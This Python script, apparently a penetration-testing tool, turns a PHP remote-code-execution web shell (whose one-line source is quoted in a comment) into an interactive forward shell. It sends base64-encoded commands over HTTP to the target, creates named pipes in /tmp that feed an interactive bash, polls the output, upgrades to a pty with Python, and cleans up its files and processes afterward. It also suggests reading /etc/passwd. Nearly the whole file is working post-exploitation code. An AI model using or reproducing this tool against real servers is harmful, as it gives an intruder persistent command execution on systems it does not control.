#!/usr/bin/python3

# Author: Hypnoze57 <Hypnoze57@protonmail.com>

"""
What the fuck is going wrong with env/pwd/whoami cmd?
# env, pwd, whoami --> echo unquotted cmd > fifo
# others cmd --> echo "cmd" > fifo
"""

import requests
import time
from threading import Thread
from random import randint
from base64 import b64encode
from termcolor import colored


WRITABLE_FOLDER     = '/tmp' # Prefer /dev/shm if write permission is set to your current user
BEACONING_DELAY     = .3 # secs
UPGRADE_CMD_DELAY   = 2 # secs

WTF_CMD             = ['env', 'pwd', 'whoami']

def execute(cmd, verbose=False, timeout=None):
    if verbose:
        pcmd = colored(cmd, 'white', 'on_red')
        print("Executing %s" % (pcmd))
        if timeout:
            print("Timeout: %s" % (timeout))

    # Encoding to avoid bad chars in URL
    cmd = b64encode(cmd.encode()).decode()

    # rce.php --> <?php @system(base64_decode($_REQUEST['cmd'])); ?>
    r = requests.get('http://pwn:54345/rce.php?cmd=%s' % (cmd), timeout=timeout)
    return r.text.strip()


class GetOutput(Thread):
    def __init__(self, sessid, removeFirstLineBeforePrinting=False):
        super(GetOutput, self).__init__(name='GetOutput')
        self.sessid = sessid

        self.rflbp = removeFirstLineBeforePrinting
        self.pause = False
        self.stop = False

    def read_output(self):
        out = execute('cat %s/out.%d' % (WRITABLE_FOLDER, self.sessid))
        if out != '':
            execute('echo '' > %s/out.%d' % (WRITABLE_FOLDER, self.sessid)) # Clean output for next GetOutput request
            return out
        return None

    def run(self):
        while not self.stop:
            while self.pause:
                time.sleep(.1)

            out = self.read_output()
            if out:
                if self.rflbp:
                    out = '\n'.join(out.split('\n')[1:])
                print('%s ' % (out), end='')
            time.sleep(BEACONING_DELAY)

class NamedPipe(object):
    def __init__(self):
        self.sessid = randint(1000,100000)

    def create(self):
        cmd = "mkfifo {F}/in.{id}".format(F=WRITABLE_FOLDER, id=self.sessid)
        execute(cmd)
        # cmd = "tail -f {F}/in.{id} | /bin/sh -i > {F}/out.{id} 2>&1".format(F=WRITABLE_FOLDER, id=self.sessid)
        cmd = "tail -f {F}/in.{id} | /bin/bash -i > {F}/out.{id} 2>&1".format(F=WRITABLE_FOLDER, id=self.sessid)
        try:
            # Blocking request because of the loop command
            execute(cmd, timeout=2)
        except requests.exceptions.Timeout:
            # print("NamedPipe request timeout, ready to go!")
            pass

    def clean(self):
        cmd = 'rm {F}/in.{id} {F}/out.{id}'.format(F=WRITABLE_FOLDER, id=np.sessid)
        execute(cmd)

    def kill_process(self):
        cmd = "kill -9 $(ps aux | grep -E -m1 '(in|out)\.%s'|awk -F ' ' '{print $2}')" % (self.sessid)
        execute(cmd)
        time.sleep(UPGRADE_CMD_DELAY)
        execute(cmd)

class FShell(object):
    def __init__(self, sessid, GetOutputThread):
        self.sessid = sessid
        self.out = GetOutputThread

        self.base_cmd = 'echo {cmd} > {F}/in.{id}'

        self.upgraded = False

    def format_cmd(self, cmd):
        return self.base_cmd.format(cmd=cmd, F=WRITABLE_FOLDER, id=self.sessid)

    def upgrade_shell(self):
        print(colored("Upgrading shell.. (~10 secs)", 'green'))

        # out.rflbp = True
        out.pause = True

        execute(self.format_cmd('"python -c \'import pty;pty.spawn(\\"/bin/bash\\")\'"'))
        time.sleep(UPGRADE_CMD_DELAY*2)
        execute(self.format_cmd('"export TERM=xterm"'))
        time.sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('"alias ls=\'ls --color=auto\'"'))
        time.sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('"alias ll=\'ls -lah\' "'))
        time.sleep(UPGRADE_CMD_DELAY)

        out.pause = False
        self.upgraded = True

    def run(self):
        while True:
            try:
                raw_cmd = input()
            except KeyboardInterrupt:
                print("\nUse 'exit_shell' command to exit...\n(You're still in the FShell even if you don't see $PS1)")
                continue
                # print("\n\nBreaking FShell")
                # break

            if raw_cmd:
                if raw_cmd == 'exit_shell':
                    print("Closing user FShell!")
                    break
                elif raw_cmd == 'upgrade_shell':
                    if not self.upgraded:
                        self.upgrade_shell()
                    else:
                        print(colored("Already upgraded!", 'red'))
                    continue
                elif raw_cmd == 'get_sessid':
                    print(colored('FShell sessid %s' % (self.sessid), 'red'))
                    continue
                elif raw_cmd not in WTF_CMD:
                    raw_cmd = '"%s"' % (raw_cmd)

                execute(self.format_cmd(raw_cmd)) #, True) # Debug mode
                time.sleep(.2) # Wait for response

        print("Closing remote shell(s)..")
        out.stop = True

        if self.upgraded:
            execute(self.format_cmd('exit ;'))
            time.sleep(UPGRADE_CMD_DELAY)
            execute(self.format_cmd('exit'))
            time.sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('exit ;'))

def advertise():
    # WARNING = "WARNING! If you don't get any response back, try to add a space and/or semi colon at the end of your command.\nEg. 'cat /etc/passwd' --> 'cat /etc/passwd ;'"
    # print(colored(WARNING, 'white', 'on_red'))
    WARNING = "WARNING! If you don't get any response back, try to add a space and/or semi colon at the end of your command."
    print(colored(WARNING, 'white', 'on_red'))
    print(colored("Eg. 'cat /etc/passwd' --> 'cat /etc/passwd ;'", 'white', 'on_red'))
    UPGRADE_MSG = "Use '%s' command to get interactive tty on the remote server" % (colored('upgrade_shell', 'red'))
    print("\n%s\n" % (UPGRADE_MSG))

if __name__ == '__main__':
    advertise()

    np = NamedPipe()
    print("Creating Named Pipe (%d)..." % (np.sessid))
    np.create()
    print("Created!")

    # Execute a command in named pipe to create output file and avoid remote server error logging for first GetOuput request
    execute('echo id > {F}/in.{id}'.format(F=WRITABLE_FOLDER, id=np.sessid))

    out = GetOutput(np.sessid)
    out.start()

    shell = FShell(np.sessid, out)
    shell.run() # Pop the shell

    print("Cleaning sessions files on the remote server...")
    np.clean()

    while out.isAlive():
        print("Waiting for 'GetOutput' thread...")
        time.sleep(1)

    print("Killing loop process!")
    np.kill_process()
    print("See you soon !")
